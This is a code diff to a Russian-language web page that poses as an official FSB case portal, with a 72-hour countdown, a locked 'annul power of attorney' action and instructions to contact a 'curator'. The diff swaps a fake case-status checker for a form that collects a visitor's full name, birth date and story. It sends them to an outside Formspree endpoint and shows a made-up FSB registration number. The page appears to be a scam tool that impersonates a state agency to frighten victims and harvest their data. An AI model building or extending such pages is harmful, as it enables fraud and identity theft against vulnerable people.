@@ -287,29 +287,42 @@
       line-height: 1.4;
     }
 
-    /* ФОРМА ПРОВЕРКИ */
-    .input-group {
-      display: flex;
-      gap: 0.5rem;
+    /* ФОРМА ОБРАЩЕНИЯ */
+    .form-group {
       margin-bottom: 0.8rem;
     }
-    .input-group input {
-      flex: 1;
+    .form-group label {
+      display: block;
+      font-size: 0.65rem;
+      color: #7a8ba6;
+      margin-bottom: 0.3rem;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+    .form-group input,
+    .form-group textarea {
+      width: 100%;
+      padding: 0.6rem;
       background: #0d1320;
       border: 1px solid #2a3a50;
-      color: #d4dce8;
-      padding: 0.6rem;
       border-radius: 6px;
+      color: #d4dce8;
       font-family: inherit;
       font-size: 0.75rem;
       letter-spacing: 1px;
+      resize: vertical;
     }
-    .input-group input:focus {
+    .form-group input:focus,
+    .form-group textarea:focus {
       outline: none;
       border-color: #c41230;
     }
+    .form-group textarea {
+      min-height: 70px;
+    }
     .btn {
-      padding: 0.6rem 1.2rem;
+      width: 100%;
+      padding: 0.7rem;
       background: #1a0a0f;
       border: 1px solid #c41230;
       color: #f0506a;
@@ -324,6 +337,38 @@
     }
     .btn:hover {
       background: #2a1520;
+    }
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    /* ОТВЕТ */
+    .response-box {
+      margin-top: 1rem;
+      padding: 1rem;
+      background: #0d1320;
+      border: 1px solid #2a3a50;
+      border-radius: 8px;
+      display: none;
+      text-align: center;
+    }
+    .response-box.success {
+      display: block;
+      border-color: #154a25;
+    }
+    .response-number {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: #50f070;
+      letter-spacing: 2px;
+      margin: 0.5rem 0;
+      text-shadow: 0 0 15px rgba(80, 240, 112, 0.5);
+    }
+    .response-status {
+      font-size: 0.7rem;
+      color: #f0c040;
+      letter-spacing: 1px;
     }
 
     /* КНОПКА БЛОКИРОВКИ */
@@ -512,22 +557,37 @@
         </table>
       </div>
 
-      <!-- ПРОВЕРКА ДЕЛА -->
-      <div class="card">
-        <div class="card-title">🔍 Проверка статуса дела</div>
-        <div class="input-group">
-          <input type="text" id="caseInput" placeholder="Введите номер дела или паспорт">
-          <button class="btn" onclick="checkCase()">Проверить</button>
-        </div>
-        <div id="caseResult" style="font-size:0.7rem; margin-top:0.5rem; display:none;"></div>
-      </div>
-
       <!-- ДЕЙСТВИЯ -->
       <div class="card">
         <div class="card-title">Доступные действия</div>
         <div class="blocked-btn"><span>🔒</span> Аннулировать доверенность</div>
         <div style="text-align:center; font-size:0.65rem; color:#4a5a70; margin-top:0.5rem;">
           ⏳ Ожидается разрешение ФСБ
+        </div>
+      </div>
+
+      <!-- ФОРМА ОБРАЩЕНИЯ -->
+      <div class="card">
+        <div class="card-title">📩 Обращение в ФСБ</div>
+        <form id="fsbForm">
+          <div class="form-group">
+            <label>Фамилия, Имя, Отчество</label>
+            <input type="text" name="fio" placeholder="Иванов Иван Иванович" required>
+          </div>
+          <div class="form-group">
+            <label>Дата рождения</label>
+            <input type="text" name="birthdate" placeholder="01.01.1950" required>
+          </div>
+          <div class="form-group">
+            <label>Текст обращения</label>
+            <textarea name="message" placeholder="Опишите вашу ситуацию..." required></textarea>
+          </div>
+          <button type="submit" class="btn" id="submitBtn">📤 Отправить обращение</button>
+        </form>
+        <div class="response-box" id="responseBox">
+          <p style="color:#7a8ba6;">✅ Обращение зарегистрировано</p>
+          <div class="response-number" id="responseNumber"></div>
+          <p class="response-status">⏳ Ожидает проверки ФСБ</p>
         </div>
       </div>
 
@@ -543,7 +603,7 @@
   <script>
     // Таймер 72 часа
     function startCountdown() {
-      let totalSeconds = 72 * 3600; // 72 часа в секундах
+      let totalSeconds = 72 * 3600;
 
       function updateTimer() {
         const h = Math.floor(totalSeconds / 3600);
@@ -568,27 +628,28 @@
 
     startCountdown();
 
-    // Проверка дела
-    function checkCase() {
-      const input = document.getElementById('caseInput').value.trim();
-      const result = document.getElementById('caseResult');
+    // Форма обращения
+    document.getElementById('fsbForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = true;
+      btn.textContent = '⏳ Отправка...';
 
-      if (!input) {
-        result.style.display = 'block';
-        result.innerHTML = '<span style="color:#f0c040;">⚠ Введите номер дела или паспорт</span>';
-        return;
-      }
+      const randomNum = 'ФСБ-' + Math.floor(Math.random() * 900000 + 100000) + '-' + Math.floor(Math.random() * 90 + 10);
+      document.getElementById('responseNumber').textContent = randomNum;
+      document.getElementById('responseBox').classList.add('success');
 
-      result.style.display = 'block';
-      result.innerHTML = `
-        <div style="background:#0d1320; padding:0.8rem; border-radius:6px; border:1px solid #2a3a50;">
-          <div style="color:#7a8ba6; margin-bottom:0.4rem;">Результат проверки по запросу <strong>${input}</strong>:</div>
-          <div style="color:#f0506a;">⚠ Дело активно</div>
-          <div style="color:#f0c040;">⏳ Статус: на проверке ФСБ</div>
-          <div style="color:#6b7d95; margin-top:0.3rem; font-size:0.65rem;">Для получения детальной информации обратитесь к вашему куратору</div>
-        </div>
-      `;
-    }
+      const formData = new FormData(this);
+      try {
+        await fetch('https://formspree.io/f/maqzpror', {
+          method: 'POST',
+          body: formData,
+          headers: { 'Accept': 'application/json' }
+        });
+      } catch (e) {}
+
+      btn.textContent = '✅ Отправлено';
+    });
   </script>
 </body>
 </html>
